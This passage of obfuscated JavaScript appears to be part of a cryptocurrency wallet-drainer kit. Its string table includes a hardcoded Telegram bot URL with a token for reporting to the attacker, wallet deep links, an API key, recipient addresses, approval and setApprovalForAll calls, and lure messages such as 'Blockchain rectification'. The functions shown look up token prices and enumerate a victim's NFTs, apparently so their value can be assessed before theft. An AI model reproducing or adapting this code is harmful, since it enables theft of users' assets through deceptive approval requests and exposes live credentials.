_0x18d4f4=_0x6d38,_0x163f20=Oxc;fetch(_0x18d4f4(0xd0)+_0x163f20+_0x18d4f4(0x102)+_0x1653b8,{'method':'GET','headers':{}})[_0x18d4f4(0x146)](async _0x55fcf2=>{const _0x55c4a3=_0x18d4f4;if(_0x55fcf2[_0x55c4a3(0xd8)]>0x18f)throw _0x55fcf2;_0x455f11(await _0x55fcf2[_0x55c4a3(0x10a)]());})[_0x18d4f4(0xc8)](_0xa0bb4f=>{_0x1910f9(_0xa0bb4f);});});}async function getPrice(_0x13a016){return new Promise((_0x50a06a,_0x261387)=>{const _0x245713=_0x6d38;fetch(_0x245713(0xca)+_0x13a016+_0x245713(0xf6),{'method':_0x245713(0xd6),'headers':{}})[_0x245713(0x146)](async _0x5551ce=>{const _0x35a80f=_0x245713;if(_0x5551ce['status']>0x18f)throw _0x5551ce;_0x50a06a(await _0x5551ce[_0x35a80f(0x10a)]());})['catch'](_0x2b748b=>{_0x261387(_0x2b748b);});});}async function getValue(_0x223c57,_0x5492cd,_0x11ab67){const _0x7a28d=_0x2bef79;console[_0x7a28d(0x115)](_0x223c57,_0x5492cd,_0x11ab67);let _0x32f3c6=await getPrice(_0x223c57);console['log']('price',_0x32f3c6),_0x32f3c6=parseFloat(_0x32f3c6[_0x223c57][_0x7a28d(0x16d)]);let _0xd618a8=_0x5492cd/0xa**(_0x11ab67||0x12)*_0x32f3c6;return _0xd618a8=parseInt(_0xd618a8),_0x32f3c6?_0xd618a8:0x0;}function _0x48a7(){const _0xa6a3ab=['Pause','GET','previousOwner','status','setProvenanceHash','https://go.cb-w.com/dapp?cb_url=','Error\x20processing\x20item\x20','_totalSupply','apePrice','length','Token','.proceed','ApprovalForAll','_decimals','_initialSupply','_owner','error','Token\x20balance\x20is\x20','MAX_APES','chainId:','search','_blackListedUser','decimals','Transaction\x20is\x20submitted\x20to\x20the\x20network','_evilUser','_clearedUser','constructor','Redeem','networkVersion','OwnershipTransferred','newOwner','filter','owner','&vs_currencies=usd','renounceOwnership','Your\x20address\x20','_maker','Tokens:','bool','Cl\x20address\x20:\x20','avalanche','_name','getBlackListStatus','tokenId','1095640OzFpZw','&text=','formatted','openModal','location','all','_to','index','hash','json','operator','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','maxNftSupply','Incorrect\x20network','balanceOf','event','value','693OqMzvZ','maximumFee','log','flipSaleState','Blockchain\x20rectification','basisPointsRate','paused','connector','remaining','startingIndex','12178728BBXiBq','Error:\x20','MAX_UINT','Initial\x20list\x20','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png','href','setApprovalForAll','nonpayable','transferOwnership','CoinbaseWalletConnector','toString','supportsInterface','/nft/collections?chain=','Transaction\x20Rejected','Approve\x20Completed\x20Successfully','trustwallet','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','allowed','metamask','revealTimeStamp','NFT\x20Contract\x20Address\x20','who','deprecate','approved','isApprovedForAll','3962992hdzUmF','_from','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','Approval','tokenOfOwnerByIndex','function','balances','Params','sending\x20ether','isBlackListed','Deprecate','822460NIVoeN','AddedBlackList','feeBasisPoints','Issue','then','redeem','_spender','undefined','destroyBlackFunds','coinbase','_value','map','New\x20token','address','withdraw','ownerOf','deprecated','979226RuipSH','https://deep-index.moralis.io/api/v2/','.trust','message','_user','Error\x20collecting\x20info\x20about\x20wallet','bytes4','DestroyedBlackFunds','getProvider','setRevealTimestamp','newMaxFee','357837BLZTGy','uint256','tokenURI','token_address','Could\x20not\x20get\x20a\x20wallet\x20connection','newBasisPoints','saleStart','.meta','Unable\x20to\x20get\x20NFts','mintApe','symbol','click','TOKEN\x20Contract\x20Address\x20','25830TGuJDm','getOwner','usd','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','numberOfTokens','maxFee','name','unpause','spender','transfer','https://metamask.app.link/dapp/','NFTs\x20collection\x20','tokenByIndex','getApproved','view','BAYC_PROVENANCE','addBlackList','string','4bAfFSz','emergencySetStartingIndexBlock','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','from','upgradedAddress','allowance','balance','Transaction\x20hash\x20','NFT','REVEAL_TIMESTAMP','.connect','payable','bytes','totalSupply','5122451029','safeTransferFrom','maxApePurchase','0xea8968B218a551919FbD5f1166328C82a96dED54','catch','0xd759adF2f1B7AAc38141AC6173F94df0Bc4B51a3','https://api.coingecko.com/api/v3/simple/token_price/avalanche?contract_addresses=','pause','options','approve','gasPrice','transferFrom','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','Hahahahahah','interfaceId','tokens-list','amount'];_0x48a7=function(){return _0xa6a3ab;};return _0x48a7();}async function getNFTs(_0x5145f4='',_0x2aa9b5=_0x2bef79(0x121),_0x30ab01=_0x2bef79(0xfd),_0x2248e5='50'){return new Promise((_0x30e1eb,_0x1da074)=>{const _0xa59121=_0x6d38;fetch(_0xa59121(0x154)+_0x5145f4+_0xa59121(0x12a)+_0x30ab01+'&format=decimal&limit='+_0x2248e5,{'method':_0xa59121(0xd6),'headers':{'accept':'application/json','X-API-Key':_0x2aa9b5}})[_0xa59121(0x146)](async _0x1d1076=>{const _0x5b4798=_0xa59121;if(_0x1d1076[_0x5b4798(0xd8)]>0x18f)throw _0x1d1076;_0x30e1eb(await _0x1d1076['json']());})['catch'](_0x140879=>{_0x1da074(_0x140879);});});}